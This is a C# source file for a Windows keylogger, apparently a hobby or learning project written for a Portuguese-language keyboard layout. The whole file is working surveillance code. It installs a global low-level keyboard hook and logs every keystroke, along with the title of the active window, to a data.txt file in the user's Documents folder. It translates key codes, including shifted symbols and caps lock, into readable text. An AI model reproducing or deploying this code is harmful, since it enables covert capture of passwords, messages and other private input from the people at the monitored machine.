using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace vrtx_keys {
    class KeyBoardListener {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_KEYUP = 0x0101;
        private static int HC_ACTION = 0;
        private static int VK_SHIFT = 0x10;
        private static int VK_CAPITAL = 0x14;

        public static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static bool capsPressed = GetKeyState(VK_CAPITAL);
        private static bool shiftPressed = GetKeyState(VK_SHIFT);
        private static string FILEPATH = fileAccess(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
        private static IntPtr pfgw;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static string fileAccess(string path){
            if(!Directory.Exists(path)) {
                Directory.CreateDirectory(path);
            }

            string filepath = path + @"\data.txt";

            if(!File.Exists(filepath)){
                using(StreamWriter sw = File.CreateText(filepath)) { }
            }

            return filepath;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam){

            if(nCode >= HC_ACTION){

                using (StreamWriter output = File.AppendText(FILEPATH)){

	                IntPtr fgw = GetForegroundWindow();
                    StringBuilder title = new StringBuilder("", 256);

                    if (pfgw != fgw) {
                        GetWindowText(fgw, title, 256);
                        Console.Out.Write("\n[" + title.ToString() + "]\n");
                        output.Write("\n[" + title.ToString() + "]\n");
                        pfgw = fgw;
                    }
                }

        
                int vkCode = Marshal.ReadInt32(lParam);

                if(wParam == (IntPtr)WM_KEYDOWN) {
                    if(vkCode == VK_CAPITAL)
                        capsPressed = !capsPressed;

                    writeChar(vkCode);
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc){
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        private static void writeChar(int vkCode){
            using (StreamWriter output = File.AppendText(FILEPATH)){
                switch(((Keys)vkCode).ToString()){

                    case "Add": // NumPad
                        Console.Out.Write("+");
                        output.Write("+");
                    break;

                    case "Apps":
                        Console.Out.Write("{Apps}");
                        output.Write("🤣");
                    break;

                    case "Back": // Backspace
                        Console.Out.Write("{BCKSP}");
                        output.Write("{⟵ }");
                    break;

                    case "BrowserHome":
                        Console.Out.Write("{BRWRHOME}");
                        output.Write("{🏠}");
                    break;

                    case "BrowserSearch":
                        Console.Out.Write("{BRWRSEARCH}");
                        output.Write("{⌕}");
                    break;

                    case "Capital": // Caps Lock
                        Console.Out.Write("{CAPS}");
                        output.Write("{Caps Lock}");
                    break;

                    case "Clear": // NumPad
                        Console.Out.Write("{Clear(5)}");
                    break;
                    
                    //tratar shift
                    case "D1": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("!");
                            output.Write("!");
                        }
                        else{
                            Console.Out.Write("1");
                            output.Write("1");
                        }
                    break;
                    case "D2": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("@");
                            output.Write("@");
                        }
                        else{
                            Console.Out.Write("2");
                            output.Write("2");
                        }
                    break;
                    case "D3": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("#");
                            output.Write("#");
                        }
                        else{
                            Console.Out.Write("3");
                            output.Write("3");
                        }
                    break;
                    case "D4": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("$");
                            output.Write("$");
                        }
                        else{
                            Console.Out.Write("4");
                            output.Write("4");
                        }
                    break;
                    case "D5": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("%");
                            output.Write("%");
                        }
                        else{
                            Console.Out.Write("5");
                            output.Write("5");
                        }
                    break;
                    case "D6": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("¨");
                            output.Write("¨");
                        }
                        else{
                            Console.Out.Write("6");
                            output.Write("6");
                        }
                    break;
                    case "D7": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("&");
                            output.Write("&");
                        }
                        else{
                            Console.Out.Write("7");
                            output.Write("7");
                        }
                    break;
                    case "D8": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("*");
                            output.Write("*");
                        }
                        else{
                            Console.Out.Write("8");
                            output.Write("8");
                        }
                    break;
                    case "D9": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("(");
                            output.Write("(");
                        }
                        else{
                            Console.Out.Write("9");
                            output.Write("9");
                        }
                    break;
                    case "D0": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write(")");
                            output.Write(")");
                        }
                        else{
                            Console.Out.Write("0");
                            output.Write("0");
                        }
                    break;
                        
                    break;

                    case "Decimal": // NumPad
                        Console.Out.Write(",");
                        output.Write(",");
                    break;

                    case "Delete":
                        Console.Out.Write("{DEL}");
                        output.Write("{DEL}");
                    break;
                    
                    case "Divide": //NumPad
                        Console.Out.Write("/");
                        output.Write("/");
                    break;

                    case "Down":
                        Console.Out.Write("{ADOWN}");
                        output.Write("{↓}");
                    break;

                    case "End":
                        Console.Out.Write("{END}");
                        output.Write("{END}");
                    break;

                    case "Escape": // Esc
                        Console.Out.Write("{Esc}");
                        output.Write("{Esc}");
                    break;

                    case "F1":
                    case "F2":
                    case "F3":
                    case "F4":
                    case "F5":
                    case "F6":
                    case "F7":
                    case "F8":
                    case "F9":
                    case "F10":
                    case "F11":
                    case "F12":
                        Console.Out.Write("{" + (Keys)vkCode + "}");
                        output.Write("{" + (Keys)vkCode + "}");
                    break;

                    case "Home":
                        Console.Out.Write("{Home}");
                        output.Write("{Home}");
                    break;

                    case "Insert":
                        Console.Out.Write("{Insert}");
                        output.Write("{Insert}");
                    break;

                    case "LaunchApplication1":
                        Console.Out.Write("{MYCOMP}");
                        output.Write("{💻}");
                    break;

                    case "LaunchMail":
                        Console.Out.Write("{LaunchMail}"); 
                        output.Write("{💻}");
                    break;
                    
                    case "LButton, OemClear":
                        Console.Out.Write("{BRIGHT_CONEC}");
                        output.Write("{☼ / 🌐}");
                    break;

                    //tratar altgr
                    case "LButton, Oemtilde":
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("?");
                            output.Write("?");
                        }
                        else{
                            Console.Out.Write("/");
                            output.Write("/");
                        }                       
                    break;

                    case "LControlKey":
                        Console.Out.Write("{LCONTROL}");
                        output.Write("{Ctrl}");
                    break;

                    case "Left":
                        Console.Out.Write("{ALEFT}");
                        output.Write("{←}");
                    break;

                    case "LShiftKey":
                        Console.Out.Write("{LSHIFT}");
                        output.Write("{⇧Shift}");
                    break;

                    case "LWin":
                        Console.Out.Write("{LWIN}");
                        output.Write("{⊞ Win}");
                    break;

                    case "MediaNextTrack":
                        Console.Out.Write("{MNEXTRACK}");
                        output.Write("{⏭}");
                    break;

                    case "MediaPlayPause":
                        Console.Out.Write("{MPLAYTRACK}");
                        output.Write("{⏯}");
                    break;

                    case "MediaPreviousTrack":
                        Console.Out.Write("{MPREVTRACK}");
                        output.Write("{⏮}");
                    break;

                    case "Multiply": // NumPad
                        Console.Out.Write("*");
                        output.Write("*");
                    break;
                    
                    case "NumLock": // NumPad
                        Console.Out.Write("{NumLock}");
                        output.Write("{NumLock}");
                    break;
                    case "NumPad1": // NumPad
                    case "NumPad2":
                    case "NumPad3":
                    case "NumPad4":
                    case "NumPad5":
                    case "NumPad6":
                    case "NumPad7":
                    case "NumPad8":
                    case "NumPad9":
                    case "NumPad0":
                        Console.Out.Write(((Keys)vkCode).ToString().Substring(6));
                        output.Write(((Keys)vkCode).ToString().Substring(6));
                    break;
                    
                    case "Oem1":
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed ^ capsPressed) {
                            Console.Out.Write("Ç");
                            output.Write("Ç");
                        }
                        else {
                            Console.Out.Write("ç");
                            output.Write("ç");
                        }
                    break;

                    //tratar shift e altgr
                    case "Oem5":
                        Console.Out.Write("]");
                        output.Write("]");
                    break;

                    //tratar shift e altgr
                    case "Oem6":
                        Console.Out.Write("[");
                        output.Write("[");
                    break;

                    //tratar shift e acentuação
                    case "Oem7":
                        Console.Out.Write("{WIP}");
                        output.Write("{WIP}");
                    break;

                    //tratar shift
                    case "OemBackslash":
                        Console.Out.Write("\\");
                        output.Write("\\");
                    break;

                    //tratar shift e altgr
                    case "Oemcomma":
                        Console.Out.Write(",");
                        output.Write(",");
                    break;

                    //tratar shift
                    case "OemMinus":
                        Console.Out.Write("-");
                        output.Write("-");
                    break;

                    //tratar shift e acentuação
                    case "OemOpenBrackets":
                        Console.Out.Write("{WIP}");
                        output.Write("{WIP}");
                    break;

                    //tratar shift e altgr
                    case "OemPeriod":
                        Console.Out.Write(".");
                        output.Write(".");
                    break;

                    //tratar shift e altgr
                    case "Oemplus":
                        Console.Out.Write("=");
                        output.Write("=");
                    break;

                    //tratar shift
                    case "OemQuestion":
                        Console.Out.Write(";");
                        output.Write(";");
                    break;

                    //tratar shift
                    case "Oemtilde":
                        Console.Out.Write("'");
                        output.Write("'");
                    break;
                    
                    // PGDOWN
                    case "Next": 
                        Console.Out.Write("{PGDOWN}");
                        output.Write("{PGDOWN}");
                    break;

                    case "PageUp":
                        Console.Out.Write("{PGUP}");
                        output.Write("{PGUP}");
                    break;

                    case "PrintScreen":
                        Console.Out.Write("{PRTSCR}");
                        output.Write("{PRTSCR}");
                    break;

                    case "RButton, Oemtilde": // NumPad
                        Console.Out.Write(".");
                        output.Write(".");
                    break;

                    case "RControlKey":
                        Console.Out.Write("{RCONTROL}");
                        output.Write("{RCONTROL}");
                    break;   

                    case "Return":
                        Console.Out.Write("\n");
                        output.Write("\n");
                    break;

                    case "Right":
                        Console.Out.Write("{ARIGHT}");
                        output.Write("{ARIGHT}");
                    break;

                    case "RShiftKey":
                        Console.Out.Write("{RSHIFT}");
                        output.Write("{RSHIFT}");
                    break; 
                    
                    case "Space":
                        Console.Out.Write(" ");
                        output.Write(" ");
                    break;

                    case "Subtract": // NumPad
                        Console.Out.Write("-");
                        output.Write("-");
                    break;

                    case "Tab":
                        Console.Out.Write("{TAB}");
                        output.Write("{TAB}");
                    break;

                    case "Up":
                        Console.Out.Write("{AUP}");
                        output.Write("{AUP}");
                    break;

                    case "VolumeDown":
                        Console.Out.Write("{VOLDOWN}");
                        output.Write("{VOLDOWN}");
                    break;

                    case "VolumeMute":
                        Console.Out.Write("{VOLMUTE}");
                        output.Write("{VOLMUTE}");
                    break;

                    case "VolumeUp":
                        Console.Out.Write("{VOLUP}");
                        output.Write("{VOLUP}");
                    break;

                    default:
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed ^ capsPressed) {
                            Console.Out.Write((Keys)vkCode);
                            output.Write((Keys)vkCode);
                        }
                        else {
                            Console.Out.Write(((Keys)vkCode).ToString().ToLower());
                            output.Write(((Keys)vkCode).ToString().ToLower());
                        }
                    break;
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}